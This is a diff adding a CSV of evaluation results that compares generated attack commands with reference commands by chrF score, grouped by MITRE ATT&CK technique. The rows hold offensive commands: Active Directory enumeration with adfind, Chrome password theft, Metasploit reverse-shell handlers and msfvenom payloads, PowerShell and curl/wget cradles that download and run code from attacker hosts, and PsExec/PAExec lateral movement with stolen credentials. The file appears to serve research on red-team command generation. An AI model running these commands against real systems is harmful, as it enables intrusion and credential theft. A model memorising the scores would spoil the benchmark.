@@ -1,0 +1,89 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitedmp,"adfind -f ""(objectcategory=group)""`",30.237,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitelinkdmp:<site_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,21.623,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc subnetdmp,`adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt`,31.629,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc gpodmp,"adfind -f ""(objectcategory=group)""`",30.75,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc fspdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,30.316,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc oudmp,"adfind -f ""(objectcategory=group)""`",33.311,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc dcdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,31.649,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`",35.485,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc kids:<dn>,"adfind -f ""(objectcategory=group)""`",24.477,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc u:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,25.271,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc userinfo:<user_name>,`adfind.exe -f (objectcategory=person) > ad_users.txt`,23.352,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc g:<group_name>,"adfind -f ""(objectcategory=group)""`",32.799,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc c:<computer_name>,`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,34.636,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -daclpipe+ <object_dn>,"adfind -f ""(objectcategory=group)""`",32.742,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sddlpsflag <object_dn>,"adfind -f ""(objectcategory=group)""`",31.778,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",32.517,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -f <victim_chrome_profile_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",23.313,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",31.512,True
+command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",48.903,True
+command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""","    ```
+    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
+    exploit
+    ```",23.054,True
+command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,26.568,True
+command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/service_install; set SERVICE_NAME <service_name>; set SERVICE_DESCRIPTION <service_description>; set PATH_TO_SCRIPT <script_path>; exploit""","```
+    use post/windows/manage/run_as
+    set CMD ""netsh advfirewall firewall add rule name='Service Host' dir=in action=allow protocol=TCP localport=5900""
+    set DOMAIN <domain_full>
+    set PASSWORD <domain_admin_password>
+    set USER <domain_admin>
+    set SESSION 3
+    exploit
+    ```",23.946,True
+command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,"```
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_https
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+    ```",24.731,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,50.883,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",57.905,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux https/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,53.316,True
+command_metasploit_TA0011_T1105.txt,metasploit,curl -o <file_path> 'https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,40.152,True
+command_metasploit_TA0011_T1105.txt,metasploit,wget -O <file_path> 'http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,39.489,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",18.663,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",28.421,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",28.497,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",18.663,True
+command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",23.157,True
+command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",15.546,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -s cmd.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",14.471,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",19.21,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -l -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",19.21,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -h -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",19.21,True
+command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",23.319,True
